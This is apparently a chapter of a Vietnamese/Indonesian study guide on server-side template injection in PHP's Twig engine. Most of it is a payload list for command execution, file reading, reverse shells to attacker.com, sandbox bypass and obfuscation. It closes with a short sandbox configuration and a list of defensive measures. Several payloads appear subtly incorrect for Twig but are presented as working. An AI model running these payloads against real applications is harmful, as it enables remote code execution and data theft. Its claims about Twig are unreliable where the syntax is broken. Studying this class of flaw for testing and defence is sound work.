# 13 - Twig (PHP)

## Tổng Quan

**Twig** là template engine phổ biến cho PHP, được sử dụng trong:

- Symfony Framework
- Drupal
- Laravel (có thể sử dụng Twig)
- CMS khác (Craft, Statamic, etc.)

## Cú Pháp Cơ Bản

```twig
{# Comment #}
{{ variable }}           {# Output variable #}
{{ user.name }}         {# Access property/method #}
{{ items[0] }}          {# Array access #}
{{ value | upper }}     {# Filter #}
{% if condition %}...{% endif %}
{% for item in items %}...{% endfor %}
{% set var = value %}
```

## Built-in Functions và Globals

```twig
{{ range(5) }}
{{ attribute(obj, 'name') }}
{{ include('template.html') }}
{{ dump(variable) }}     {# Only in debug mode #}
{{ _self }}              {# Template object #}
{{ _context }}           {# All variables #}
```

## SSTI Payloads - Twig

### Basic Detection

```twig
# Math expression
{{ 7*7 }}              → 49

# Object access
{{ _self }}            → Template object reference

# Filter test
{{ "test" | length }}  → 4
```

### Null/Undefined Behavior

```twig
# Twig lebih ketat daripada Jinja2
{{ undefined_var }}    → Error (tidak seperti Jinja2)
{{ null.property }}    → Error
```

## RCE via Object Methods

### Twig PHP Object Access

Twig memungkinkan akses ke method public:

```twig
# Access object method
{{ user.getName() }}        {# Call method #}
{{ user.getEmail() }}

# Chain methods
{{ user.getProfile().getAvatar() }}
```

### Exploiting getFilter/getFunction

Jika custom filters registered, attacker bisa exploit:

```twig
# If application register dangerous filter
{{ 'id' | dangerous_filter }}

# Or via registerUndefinedFilterCallback
{{ _self.env.registerUndefinedFilterCallback("exec")("whoami") }}
```

## Dangerous Methods/Functions

### PHP Reflection Classes

```twig
# Access PHP classes
{{ _self.env.getFilter('system')('whoami') }}

# Via registerUndefinedFilterCallback
{{ _self.env.registerUndefinedFilterCallback("exec")("id") }}
```

### getFilter/getFunction Methods

```twig
# In vulnerable Twig versions
{{ _self.env.getFilter("system")("whoami") }}

# Alternative
{{ app.container.get('templating.engine.twig').env.getFilter('system')('whoami') }}
```

## Exploit Chains

### Method 1: Via `_self.env`

```twig
{{ _self.env.registerUndefinedFilterCallback("system")("whoami") }}
```

**Explanation:**

- `_self` → Template object
- `.env` → Twig environment
- `.registerUndefinedFilterCallback()` → Register arbitrary callback
- `("system")` → PHP system function
- `("whoami")` → Command to execute

### Method 2: Via Filter Object

```twig
{%set x=_self.env.getFilter("system")%}{{x("whoami")}}
```

### Method 3: Include/Require PHP Files

```twig
{# Jika aplikasi menggunakan include dinamis #}
{{ include("path_controlled_by_attacker") }}

# PHP include wrapper
{{ include("php://filter/convert.base64-encode/resource=config.php") }}
```

## File Reading

### Via File Functions

Jika PHP functions exposed:

```twig
{{ file_get_contents('/etc/passwd') }}
{{ readfile('/var/www/html/config.php') }}
```

### Via Directory Traversal (Include)

```twig
{{ include('../../../etc/passwd') }}
{{ include('php://filter/resource=/etc/passwd') }}
```

## Environment Variables & Config

### Access Superglobals

```twig
# $_SERVER
{{ _SERVER }}

# $_ENV
{{ _ENV }}

# $_GET, $_POST
{{ _GET }}
{{ _POST }}
```

### Access App Container (Symfony)

```twig
{{ app }}              {# Symfony global #}
{{ app.environment }}  {# Get environment #}
{{ app.request }}      {# Get request object #}
{{ app.user }}         {# Get current user #}
```

## Reverse Shell

### Bash via system()

```twig
{{ system("bash -i >& /dev/tcp/attacker.com/4444 0>&1") }}
```

### Using shell_exec

```twig
{{ shell_exec("bash -i >& /dev/tcp/attacker.com/4444 0>&1") }}
```

## Sandbox Bypass

### Using Alternative Functions

Jika `system` diblokir:

```twig
{{ passthru("id") }}
{{ exec("id") }}
{{ proc_open("id", [1 => ['pipe', 'w']], $pipes) }}
```

### Reflection Classes

```twig
# Using ReflectionClass
{%set x='ReflectionClass'%}
{%set c=_self.env.getFilter('ReflectionClass')('system')%}
```

## Obfuscation

### String Concatenation

```twig
{{ (system)("whoami") }}
{{ ("sy"+"stem")("id") }}
```

### URL Encoding dalam Payload

```twig
{{ system(urldecode("%69%64")) }}
```

## Blind SSTI

### Time-Based via sleep()

```twig
{{ sleep(5) }}

# Or wrapped in condition
{% if 7*7==49 %}{{ sleep(5) }}{% endif %}
```

### Write to Disk

```twig
{{ file_put_contents('/tmp/pwned.txt','success') }}
```

## Detection Payloads untuk Twig

```twig
# Basic math
{{ 7*7 }}              → 49 or error

# Object reference
{{ _self }}            → Template object info

# Global access
{{ _SERVER }}          → Superglobal access

# Environment
{{ _self.env }}        → Environment object
```

## Twig Security Configuration

```php
<?php
// Safe Twig configuration

use Twig\Environment;
use Twig\Loader\ArrayLoader;
use Twig\Sandbox\SandboxExtension;
use Twig\Sandbox\SecurityPolicy;

// Define allowed functions, filters, tags
$policy = new SecurityPolicy(
    ['range', 'constant', 'cycle'], // allowed functions
    ['abs', 'capitalize', 'upper'],  // allowed filters
    ['for', 'if', 'set'],             // allowed tags
    [],                                // allowed properties
    []                                 // allowed methods
);

$twig = new Environment(new ArrayLoader([]));
$twig->addExtension(new SandboxExtension($policy));

// Always pass data as context, never concatenate
$template = $twig->createTemplate("Hello {{ name }}");
echo $template->render(['name' => $user_input]);  // SAFE
?>
```

## Defensive Measures

1. **Never concatenate user input into template code**
2. **Use Twig's sandbox extension**
3. **Whitelist allowed functions and filters**
4. **Validate template names if using dynamic includes**
5. **Keep Twig updated**
6. **Run with minimal PHP function exposure**

## Tài Liệu Liên Quan

- [04-exploitation-techniques.md](04-exploitation-techniques.md) - Kỹ thuật khai thác
- [09-jinja2-python.md](09-jinja2-python.md) - Jinja2
